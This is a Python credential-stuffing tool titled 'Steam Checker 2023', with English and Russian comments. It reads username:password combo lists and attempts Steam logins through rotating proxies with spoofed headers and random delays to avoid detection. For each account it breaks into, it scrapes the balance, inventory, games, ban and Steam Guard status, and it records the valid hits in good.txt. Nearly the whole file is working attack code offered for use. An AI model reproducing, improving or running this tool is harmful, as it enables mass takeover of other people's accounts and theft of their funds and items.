# Importing modules | Импортируем модули
import requests
import rsa
import base64
import json
import time
import certifi
import io
import random
import os
from fake_headers import Headers
from colorama import Fore, Back, Style
from colorama import init
from datetime import datetime
from bs4 import BeautifulSoup

# Setting up time output | Настройка вывода времени
Time_Output = (f'{Fore.WHITE}{Style.BRIGHT}[%H:%M:%S] - ')

# Creating autoreset style for colorama | Создаем автосброс стиля для colorama
init(autoreset=True)

# Creating Title | Создаем оглавление
print(f'{Fore.CYAN}{Style.BRIGHT}Steam Checker 2023 by Fsocguy{Fore.WHITE}{Style.BRIGHT}\n\nMade by request of {Fore.YELLOW}{Style.BRIGHT}Titya01{Fore.YELLOW}{Style.BRIGHT}\nVersion: {Fore.WHITE}{Style.BRIGHT}2.0{Fore.YELLOW}{Style.BRIGHT}\nLast Update: {Fore.WHITE}{Style.BRIGHT}29.07.23')
print(f'{Fore.WHITE}{Style.BRIGHT}\nMade With Love From Donetsk {Fore.BLUE}{Style.BRIGHT}People {Fore.RED}{Style.BRIGHT}Republic {Fore.WHITE}{Style.BRIGHT}!')

# Printing the progress information to the user | Выводим информацию о выполнении пользователю
print(f'\n{datetime.now().strftime(Time_Output)}{Fore.GREEN}{Style.BRIGHT}[PROGRAM | Combos]: {Fore.WHITE}{Style.BRIGHT}Reading combos from {Fore.YELLOW}{Style.BRIGHT}combos.txt {Fore.WHITE}{Style.BRIGHT}...')

# Checking the path to the combos.txt file, and if it is missing, printing an error and creating a new file | Проверяем путь к файлу combos.txt и в случае если его нету, выводим ошибку и создаем новый файл
Combos_File_Path = 'combos.txt'
if not os.path.exists(Combos_File_Path):   
    print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[PROGRAM | Combos | ERROR]: {Fore.WHITE}{Style.BRIGHT}File {Fore.YELLOW}{Style.BRIGHT}combos.txt {Fore.WHITE}{Style.BRIGHT}not found ! Creating new file ...')
    with open(Combos_File_Path, 'w', encoding='utf-8') as F:
        pass
    print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[PROGRAM | Combos | ERROR]: {Fore.WHITE}{Style.BRIGHT}New file created! Fill it with combo lines and restart the program!')
    exit()

# Printing the progress information to the user | Выводим информацию о выполнении пользователю
print(f'{datetime.now().strftime(Time_Output)}{Fore.GREEN}{Style.BRIGHT}[PROGRAM | Proxies]: {Fore.WHITE}{Style.BRIGHT}Reading proxies from {Fore.YELLOW}{Style.BRIGHT}proxies.txt {Fore.WHITE}{Style.BRIGHT}...')

# Checking the path to the proxies.txt, and if it is missing, printing an error and creating a new file | Проверяем путь к файлу proxies.txt и в случае если его нету, выводим ошибку и создаем новый файл
Proxies_File_Path = 'proxies.txt'
if not os.path.exists(Proxies_File_Path):
    print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[PROGRAM | Proxies | ERROR]: {Fore.WHITE}{Style.BRIGHT}File {Fore.YELLOW}{Style.BRIGHT}proxies.txt {Fore.WHITE}{Style.BRIGHT}not found ! Creating new file ...')
    with open(Proxies_File_Path, 'w', encoding='utf-8') as F:
        pass
    print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[PROGRAM | Proxies | ERROR]: {Fore.WHITE}{Style.BRIGHT}New file created! Fill it with proxy lines and restart the program!')
    exit()

# Creating a main function that takes values Login, Password | Создаем основную функцию которая принимает значения Login,Password
def Main_Function(Login, Password):
    # Creating rotating proxy pool for requests | Создаем прокси пул для запросов
    Proxy_Pool = []
    with open(Proxies_File_Path, 'r', encoding='utf-8') as File:
        for Line in File:
            Line = Line.strip()
            # Categorizing proxies by type (HTTP, HTTPS, SOCKS) | Распределяем прокси по типам (HTTP, HTTPS, SOCKS)
            if Line.startswith('http://'):
                Proxy_Pool.append({'http': Line})
            elif Line.startswith('https://'):
                Proxy_Pool.append({'https': Line})
            elif Line.startswith('socks'):
                Proxy_Pool.append({'https': Line, 'http': Line})
        if not Proxy_Pool:
            print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[PROGRAM | Combos | ERROR]: {Fore.WHITE}{Style.BRIGHT}No proxy lines found in file {Fore.YELLOW}{Style.BRIGHT}proxies.txt {Fore.WHITE}{Style.BRIGHT}Check your file and restart the program!')
            exit()
    
    # Printing the information about the login/password pair that will be checked | Выводим информацию о паре логин/пароль которые будут проверены
    print(f'{datetime.now().strftime(Time_Output)}{Fore.GREEN}{Style.BRIGHT}[Account Checking | Combo]: {Fore.WHITE}{Style.BRIGHT}Trying to check {Fore.YELLOW}{Style.BRIGHT}{Login};{Password}{Fore.WHITE}{Style.BRIGHT} account{Fore.WHITE}{Style.BRIGHT}...')

    # Creating attemps for retrying request in case of errors | Создаем количество попыток повтора запроса в случае ошибок
    Request_Max_Attempts = 13

    # Creating a variable for sessions
    Session = requests.Session()

    # Creating HTTP header generator | Создаем генератор HTTP заголовков
    Header = Headers(
        headers = True
    )

    # Sending request to the server with login/password to retrieve and decode RSA key | Отправляем запрос к серверу с логином/паролем для получения и декодирования RSA ключа
    for Attempt in range(Request_Max_Attempts):
        # Setting up request | Настраиваем запрос
        Proxy = random.choice(Proxy_Pool)
        Request_Header = Header.generate()
        Request_Timeout = random.uniform(3, 13)
        Retrying_Delay = random.uniform(5, 15)

        # Getting an RSA key and decoding it | Получаем и декодируем RSA ключ
        try:
            Responce_RSA = Session.get(f'https://steamcommunity.com/login/getrsakey?username={Login}', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, verify=certifi.where())
            Responce_Decrypt = Responce_RSA.json()
            Mod = int(Responce_Decrypt['publickey_mod'], 16)
            Exp = int(Responce_Decrypt['publickey_exp'], 16)
            Pub_key = rsa.PublicKey(Mod, Exp)
            Password_encrypted = base64.b64encode(rsa.encrypt(Password.encode(), Pub_key))

            # If the request is successful, stopping further attempts | Если запрос успешный, прекращаем попытки дальнейшего запроса
            if Responce_RSA.ok:
                print(f'{datetime.now().strftime(Time_Output)}{Fore.GREEN}{Style.BRIGHT}[Account Checking | RSA Request]: {Fore.GREEN}Success!')
                break

        # If the user was using Socks proxy and an error occurs, show him information about it | Если пользователь использовал SOCKS прокси и вылезла ошибка, выводим ему информацию об этом
        except requests.exceptions.SSLError:
            print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[Account Checking | RSA Request | ERROR]: {Fore.WHITE}{Style.BRIGHT}SOCKS proxy caused an error with SSL on request. To avoid such errors, use only HTTP/HTTPS proxies! Retrying the request after {Fore.YELLOW}{Style.BRIGHT}{Retrying_Delay} {Fore.WHITE}{Style.BRIGHT}seconds...')

        # If an error occurs during the request, we display information about it to the user | Если возникает ошибка при запросе, выводим информацию об этом пользователю
        except requests.exceptions.RequestException as Error:
            print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[Account Checking | RSA Request | ERROR]: {Fore.WHITE}{Style.BRIGHT}An error occurred during the request, retrying the request after {Fore.YELLOW}{Style.BRIGHT}{Retrying_Delay} {Fore.WHITE}{Style.BRIGHT}seconds...')

        # Applying the delay | Применяем задержку
        time.sleep(Retrying_Delay)

    # If all attempts are exhausted and the request is still unsuccessful, displaying information about this to the user | Если все попытки исчерпаны, а запрос до сих пор неуспешный, выводим информацию об этом пользователю
    else:
        print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[Account Checking | RSA Request | ERROR]: {Fore.WHITE}{Style.BRIGHT}After all the retry attempts, the request still gives an error. Perhaps the problem is on the server side or you have a bad proxy. Try to restrart the script a little later.')
        exit()

    # Printing the information about the login/password pair into which the login will be performed | Выводим информацию о паре логин/пароль в которые будет осуществлен логин
    print(f'{datetime.now().strftime(Time_Output)}{Fore.GREEN}{Style.BRIGHT}[Account Checking | Login]: {Fore.WHITE}{Style.BRIGHT}Trying to login into {Fore.YELLOW}{Style.BRIGHT}{Login};{Password} {Fore.WHITE}{Style.BRIGHT}account...')

    # Sending POST request to the server with login/password and decoded RSA key | Отправляем POST запрос к серверус логином/паролем,  а также декодированным RSA ключом
    for Attempt in range(Request_Max_Attempts):
        # Setting up request | Настраиваем запрос
        Proxy = random.choice(Proxy_Pool)
        Request_Header = Header.generate()
        Request_Timeout = random.uniform(3, 13)
        Retrying_Delay = random.uniform(5, 15)

        # Sending a POST request to the server with the data already received
        try:
            Responce_Login = Session.post('https://steamcommunity.com/login/dologin/', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, verify=certifi.where(), data={
            'username': Login,
            'password': Password_encrypted,
            'rsatimestamp': Responce_Decrypt['timestamp'],
            'remember_login': False
            })

            # Creating a variable for the json response from the server | Создаем переменную для json ответа от сервера
            Json_Data = Responce_Login.json()

            # If the request is successful, stopping further attempts | Если запрос успешный, прекращаем попытки дальнейшего запроса
            if Responce_Login.ok and Json_Data is not None:
                break
        
         # If the user was using Socks proxy and an error occurs, show him information about it | Если пользователь использовал SOCKS прокси и вылезла ошибка, выводим ему информацию об этом
        except requests.exceptions.SSLError:
            print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[Account Checking | Login | ERROR]: {Fore.WHITE}{Style.BRIGHT}SOCKS proxy caused an error with SSL on request. To avoid such errors, use only HTTP/HTTPS proxies! Retrying the request after {Fore.YELLOW}{Style.BRIGHT}{Retrying_Delay} {Fore.WHITE}{Style.BRIGHT}seconds...')
        
        # If an error occurs during the request, we display information about it to the user | Если возникает ошибка при запросе, выводим информацию об этом пользователю
        except requests.exceptions.RequestException as Error:
            print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[Account Checking | Login | ERROR]: {Fore.WHITE}{Style.BRIGHT}An error occurred during the request, retrying the request after {Fore.YELLOW}{Style.BRIGHT}{Retrying_Delay} {Fore.WHITE}{Style.BRIGHT}seconds...')
        
        # Applying the delay | Применяем задержку
        time.sleep(Retrying_Delay)
    
    # If all attempts are exhausted and the request is still unsuccessful, displaying information about this to the user | Если все попытки исчерпаны, а запрос до сих пор неуспешный, выводим информацию об этом пользователю
    else:
        print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[Account Checking | Login | ERROR]: {Fore.WHITE}{Style.BRIGHT}After all the retry attempts, the request still gives an error. Perhaps the problem is on the server side or you have a bad proxy. Try to restrart the script a little later.')
        exit()

    # If JSON response is successful, calling the parsers | Если ответ JSON успешный, вызывем парсеры
    if Json_Data.get('success') == True:
        # Printing info about succesful login to user | Выводим информацию об успешном логине пользователю
        print(f'{datetime.now().strftime(Time_Output)}{Fore.GREEN}{Style.BRIGHT}[Account Checking | Login]: {Fore.GREEN}Success!')
        
        # Creating variables for SteamID and Cookies
        Steam_Login_Secure = Session.cookies.get('steamLoginSecure')
        SteamID = Json_Data['transfer_parameters']['steamid']
        Cookie = {'steamLoginSecure': Steam_Login_Secure}

        # Creating a delay between parser requests | Создаем задержку между запросами парсера
        Parser_Delay = random.uniform(1, 2)

        # Creating a function for parsing account nickname | Создаем функцию парсинга никнейма аккаунта
        def Get_Account_Nickname(Cookie, SteamID, Proxy, Request_Header, Request_Timeout):
            # Sending a request to the server to parse an account nickname | Отправляем запрос к серверу для парсинга никнейма
            try:
                Responce_Nickname = Session.get(f'https://steamcommunity.com/profiles/{SteamID}/', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, cookies=Cookie)
                Soup = BeautifulSoup(Responce_Nickname.text, 'lxml')
                Account_Nickname = Soup.find('span', class_='actual_persona_name').text.strip()
                return Account_Nickname
            except AttributeError:
                return None

        # Creating a function for parsing account level | Создаем функцию парсинга уровня аккаунта
        def Get_Account_Level(Cookie, SteamID, Proxy, Request_Header, Request_Timeout):
            # Applying the delay | Применяем задержку
            time.sleep(Parser_Delay)

            # Sending a request to the server to parse an account level | Отправляем запрос к серверу для парсинга уровня аккаунта
            try:
                Responce_Level = Session.get(f'https://steamcommunity.com/profiles/{SteamID}', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, cookies=Cookie)
                Soup = BeautifulSoup(Responce_Level.text, 'lxml')
                Account_Level = Soup.find('span', class_='friendPlayerLevelNum').text.strip()
                return Account_Level
            except AttributeError:
                return None

        # Creating a function for parsing account balance | Создаем функцию парсинга баланса аккаунта
        def Get_Account_Balance(Cookie, SteamID, Proxy, Request_Header, Request_Timeout):
            # Applying the delay | Применяем задержку
            time.sleep(Parser_Delay)

            # Sending a request to the server to receive and parse the account balance | Отправляем запрос на сервер для парсинга баланса аккаунта
            try:
                Responce_Balance = Session.get('https://store.steampowered.com/account/store_transactions/', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, cookies=Cookie)
                Soup = BeautifulSoup(Responce_Balance.text, 'lxml')
                Account_Balance_Find = Soup.find('div', class_='accountRow accountBalance')
                Account_Balance = Account_Balance_Find.find('a').text.strip()
                return Account_Balance
            except AttributeError:
                try:
                    Account_Balance = Account_Balance_Find('div').text.strip()
                    return Account_Balance
                except AttributeError:
                    try:
                        Account_Balance = Soup.find('div', class_='accountData price').text.strip()
                        return Account_Balance
                    except AttributeError:
                        return None

        # Creating a function for parsing account level | Создаем функцию парсинга EMAIL верификации аккаунта
        def Get_Account_Email_Verification(Cookie, SteamID, Proxy, Request_Header, Request_Timeout):
            # Applying the delay | Применяем задержку
            time.sleep(Parser_Delay)

            # Sending a request to the server to recieve and parse the account EMAIL verification | Отправляем запрос к серверу для получения и парсинга EMAIL верификации аккаунта
            try:
                Responce_Email_Verification = Session.get('https://store.steampowered.com/account/', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, cookies=Cookie)
                Soup = BeautifulSoup(Responce_Email_Verification.text, 'lxml')
                Account_Email_Verification = Soup.find('a', class_='account_data_field').text.strip()
                return Account_Email_Verification
            except AttributeError:
                return None

        # Creating a function for parsing account limits | Создаем функцию парсинга лимитов аккаунта
        def Get_Account_Limit(Cookie, SteamID, Proxy, Request_Header, Request_Timeout):
            # Applying the delay | Применяем задержку
            time.sleep(Parser_Delay)

            # Sending a request to the server to recieve and parse the account limits Steam Guard | Отправляем запрос к серверу для получения и парсинга ограничений аккаунта из за Steam Guard
            try:
                Responce_Limit = Session.get('https://store.steampowered.com/account/', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, cookies=Cookie)
                Soup = BeautifulSoup(Responce_Limit.text, 'lxml')
                Account_Limit = Soup.find('div', class_='account_data_field').text.strip()
                if Account_Limit == 'Steam Guard is not enabled for this account.':
                    return True
                else:
                    return False
            except AttributeError:
                return None
    
        # Creating a function for parsing account community ban | Создаем функцию парсинга бана комьюнити
        def Get_Account_Community_Ban(Cookie, SteamID, Proxy, Request_Header, Request_Timeout):
            # Applying the delay | Применяем задержку
            time.sleep(Parser_Delay)

            # Sending a request to the server to recieve and parse the account community ban| Отправляем запрос к серверу для получения и парсинга бана сообщества аккаунта
            try:
                Responce_Community_Ban = Session.get(f'https://steamcommunity.com/profiles/{SteamID}', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, cookies=Cookie)
                Soup = BeautifulSoup(Responce_Community_Ban.text, 'lxml')
                Account_Community_Ban = Soup.find('div', class_='profile_ban_status ban_status_header').text.strip()
                if Account_Community_Ban == 'Your profile is being forced private due to an active Community Ban on your account.':
                    return True
                elif Account_Community_Ban == 'Ваш профиль скрыт из-за блокировки в сообществе Steam.':
                    return True
            except AttributeError:
                try:
                    Responce_Community_Ban_V2 = Session.get(f'https://steamcommunity.com/profiles/{SteamID}/edit/info', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, cookies=Cookie)
                    Account_Community_Ban = Soup.find('div', class_='profile_fatalerror_message').text.strip()
                    if Account_Community_Ban == 'Your account has been blocked from participating in the Steam Community.':
                        return True
                except AttributeError:
                    return False
    
        # Creating a function for parsing account VAC ban | Создаем функцию для парсинга VAC бана аккаунта
        def Get_Account_VAC(Cookie, SteamID, Proxy, Request_Header, Request_Timeout):
            # Applying the delay | Применяем задержку
            time.sleep(Parser_Delay)

            # Sending a request to the server to recieve and parse account VAC status | Отправляем запрос к серверу для получения и парсинга VAC статуса аккаунта
            try:
                Responce_VAC = Session.get('https://help.steampowered.com/en/wizard/VacBans', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, cookies=Cookie)
                Soup = BeautifulSoup(Responce_VAC.text, 'lxml')
                Account_VAC = Soup.find('div', class_='vac_ban_header')
                if Account_VAC:
                    return True
            except AttributeError:
                try:
                    Account_VAC = Soup.find('div', class_='no_vac_bans_header').text.strip()
                    print(Account_VAC)
                    if Account_VAC == 'Account In Good VAC Standing':
                        return False
                except AttributeError:
                    return None

        # Creating a function for parsing account inventory | Создаем функцию для парсинга инвентаря аккаунта
        def Get_Account_Inventory(Cookie, SteamID, Proxy, Request_Header, Request_Timeout):
            # Applying the delay | Применяем задержку
            time.sleep(Parser_Delay)

            # Creating a list to return it | Создаем список который потом вернем
            Account_Inventory = []

            # Sending a requst to the server to recieve and parse account inventory | Отправляем запрос к серверу для получения и парсинга инвентаря аккаунта
            try:
                Responce_Inventory = Session.get(f'https://steamcommunity.com/profiles/{SteamID}/inventory/', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, cookies=Cookie)
                Soup = BeautifulSoup(Responce_Inventory.text, 'lxml')
                Inventory_Name = Soup.find_all('span', class_='games_list_tab_name')
                Inventory_Value = Soup.find_all('span', class_='games_list_tab_number')

                for Name, Value in zip(Inventory_Name, Inventory_Value):
                    Account_Inventory.append(Name.text.strip() + " " + Value.text.strip())

            except AttributeError:
                return None

            return Account_Inventory
        
        # Creating a function for parsing account games | Создаем функцию для парсинга игр аккаунта
        def Get_Account_Games(Cookie, SteamID, Proxy, Request_Header, Request_Timeout):
            # Applying the delay | Применяем задержку
            time.sleep(Parser_Delay)

            # Creating a list to return it | Создаем список который потом вернем
            Account_Games = []
            Account_Games_Count = 0

            # Sending a requst to the server to recieve and parse account games| Отправляем запрос к серверу для получения и парсинга игр аккаунта
            try:
                Responce_Games = Session.get(f'https://steamcommunity.com/profiles/{SteamID}/games/?tab=all', headers=Request_Header, proxies=Proxy, timeout=Request_Timeout, cookies=Cookie)
                Soup = BeautifulSoup(Responce_Games.text, 'lxml')

                # Searching for a setting element and converting it to JSON | Ищем элемент настройки и конвертируем его в JSON
                Games_Template_Find = Soup.find('template', id='gameslist_config')
                Data = Games_Template_Find['data-profile-gameslist']
                Data = Data.replace('&quot;', '"')
                Games_Template_JSON = json.loads(Data)
                Account_Games_Count = len(Games_Template_JSON['rgGames'])
        
                # Passing through the elements and return items to the list | Проходимся по элементам и возвращаем элементы в список
                for i, item in enumerate(Games_Template_JSON['rgGames'], start=1):
                    Game_Name = item['name']
                    Game_Time = item['playtime_forever']
                    Game_Hours = Game_Time / 60
                    Account_Games.append({
                        'name': Game_Name,
                        'hours': Game_Hours
                    })
    
            except AttributeError:
                return None

            return Account_Games, Account_Games_Count

    
        # Checking the path to the file good.txt, if it does not exist, creating it | Проверяем путь к файлу good.txt, если его нету , создаем его
        Good_File_Path = 'good.txt'
        if not os.path.exists(Good_File_Path):
            print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[PROGRAM | Good | ERROR]: {Fore.WHITE}{Style.BRIGHT}File {Fore.YELLOW}{Style.BRIGHT}good.txt {Fore.WHITE}{Style.BRIGHT}not found ! Creating new file ...')
            with open(Good_File_Path, 'w', encoding='utf-8') as F:
                pass

        # Calling the functions | Вызываем функции
        Account_Nickname = Get_Account_Nickname(Cookie, SteamID, Proxy, Request_Header, Request_Timeout)
        Account_Level = Get_Account_Level(Cookie, SteamID, Proxy, Request_Header, Request_Timeout)
        Account_Balance = Get_Account_Balance(Cookie, SteamID, Proxy, Request_Header, Request_Timeout)
        Account_Email_Verification = Get_Account_Email_Verification(Cookie, SteamID, Proxy, Request_Header, Request_Timeout)
        Account_Limit = Get_Account_Limit(Cookie, SteamID, Proxy, Request_Header, Request_Timeout)    
        Account_VAC = Get_Account_VAC(Cookie, SteamID, Proxy, Request_Header, Request_Timeout)
        Account_Inventory = Get_Account_Inventory(Cookie, SteamID, Proxy, Request_Header, Request_Timeout)
        Account_Games, Account_Games_Count = Get_Account_Games(Cookie, SteamID, Proxy, Request_Header, Request_Timeout)
        Account_Community_Ban = Get_Account_Community_Ban(Cookie, SteamID, Proxy, Request_Header, Request_Timeout)

        # Output the information obtained from the functions to the user | Выводим полученную из функций информацию пользователю
        print(f'{Fore.GREEN}\nAccount: {Login};{Password}')
        print(f'{Fore.GREEN}Account Status: Valid')
        print(f'{Fore.GREEN}Account URL: https://steamcommunity.com/profiles/{SteamID}')
        print(f'{Fore.GREEN}Account Nickname: {Account_Nickname}')
        print(f'{Fore.GREEN}Account Level: {Account_Level}')
        print(f'{Fore.GREEN}Account Balance: {Account_Balance}')
        print(f'{Fore.GREEN}Account EMAIL Verification: {Account_Email_Verification}')
        print(f'{Fore.GREEN}Account Community Ban: {Account_Community_Ban}')
        print(f'{Fore.GREEN}Account Limit: {Account_Limit}')
        print(f'{Fore.GREEN}Account VAC: {Account_VAC}')
        print(f'{Fore.GREEN}Account Inventories: {Account_Inventory}')
        print(f'{Fore.GREEN}<========================<Games: [{Account_Games_Count}]>========================>')
        for i, Game in enumerate(Account_Games, start=1):
            Game_Name = Game['name']
            Game_Hours = Game['hours']
            print(f'{Fore.GREEN}[#{i}] - [Game: {Game_Name}] - [Played: {Game_Hours:.1f} hours]')
        print(' ')
        
        # Saving recieved info to good.txt file | Сохраняем полученную информацию в good.txt файл
        with io.open('good.txt', 'a', encoding='utf-8') as File:
            File_Save_Output = (f'Account: {Login};{Password}\nAccount Status: Valid\nAccount URL: https://steamcommunity.com/profiles/{SteamID}\nAccount Nickname: {Account_Nickname}\nAccount Level: {Account_Level}\nAccount Balance: {Account_Balance}\nAccount EMAIL Verification: {Account_Email_Verification}\nAccount Community Ban: {Account_Community_Ban}\nAccount Limit: {Account_Limit}\nAccount VAC: {Account_VAC}\nAccount Inventories: \n{Account_Inventory}\n<========================<Games: [{Account_Games_Count}]>========================>')
            for i, Game in enumerate(Account_Games, start=1):
                Game_Name = Game['name']
                Game_Hours = Game['hours']
                File_Save_Output += f'\n[#{i}] - [Game: {Game_Name}] - [Played: {Game_Hours:.1f} hours]'
            File_Save_Output += '\n\n'
            File.write(File_Save_Output)

    # If JSON Responce contains info about email аuthentication, printing this info to user | Если JSON ответ содержит информацию об двухфакторной аутентификации через EMAIL, выводим информацию об этом пользователю
    elif Json_Data.get('emailauth_needed') == True:
        print(f'{datetime.now().strftime(Time_Output)}{Fore.GREEN}{Style.BRIGHT}[Account Checking | Login]: {Fore.RED}Unsuccesful!')
        print(f'{Fore.RED}\nAccount: {Login};{Password}')
        print(f'{Fore.RED}Status: Email Auth\n')
    
    # If JSON Responce contains info about twofactor аuthentication (STEAM GUARD), printing this info to user | Если JSON ответ содержит информацию об двухфакторной аутентификации через STEAM GUARD, выводим информацию об этом пользователю
    elif Json_Data.get('requires_twofactor') == True:
        print(f'{datetime.now().strftime(Time_Output)}{Fore.GREEN}{Style.BRIGHT}[Account Checking | Login]: {Fore.RED}Unsuccesful!')
        print(f'{Fore.RED}\nAccount: {Login};{Password}')
        print(f'{Fore.RED}Status: Steam Guard\n')
    
    # If JSON Responce contains info about unvalid account, printing this info to user | Если JSON ответ содержит информацию о невалидном аккаунте, выводим информацию от этом пользователю
    elif Json_Data.get('message') == 'The account name or password that you have entered is incorrect.':
        print(f'{datetime.now().strftime(Time_Output)}{Fore.GREEN}{Style.BRIGHT}[Account Checking | Login]: {Fore.RED}Unsuccesful!')
        print(f'{Fore.RED}\nAccount: {Login};{Password}')
        print(f'{Fore.RED}Status: Not Valid\n')

    # If JSON Responce contains info about captcha verification, printing this info to user | Если JSON ответ содержит информацию о капча-проверке, выводим информацию об этом пользователю
    elif Json_Data.get('message') == 'Please verify your humanity by re-entering the characters in the captcha.':
        print(f'{datetime.now().strftime(Time_Output)}{Fore.GREEN}{Style.BRIGHT}[Account Checking | Login]: {Fore.RED}Unsuccesful!')
        print(f'{Fore.RED}\nAccount: {Login};{Password}')
        print(f'{Fore.RED}Status: Captcha\n')

# Reading the lines from the combos.txt file
with open(Combos_File_Path, 'r', encoding='utf-8') as File:
    Lines = File.readlines()
    for Line in Lines:
        Login, Password = Line.strip().split(':')
        Main_Function(Login, Password)
    if not Lines:
        print(f'{datetime.now().strftime(Time_Output)}{Fore.RED}{Style.BRIGHT}[PROGRAM | Combos | ERROR]: {Fore.WHITE}{Style.BRIGHT}No combo lines found in file {Fore.YELLOW}{Style.BRIGHT}combos.txt {Fore.WHITE}{Style.BRIGHT}Check your file and restart the program!')
        exit()
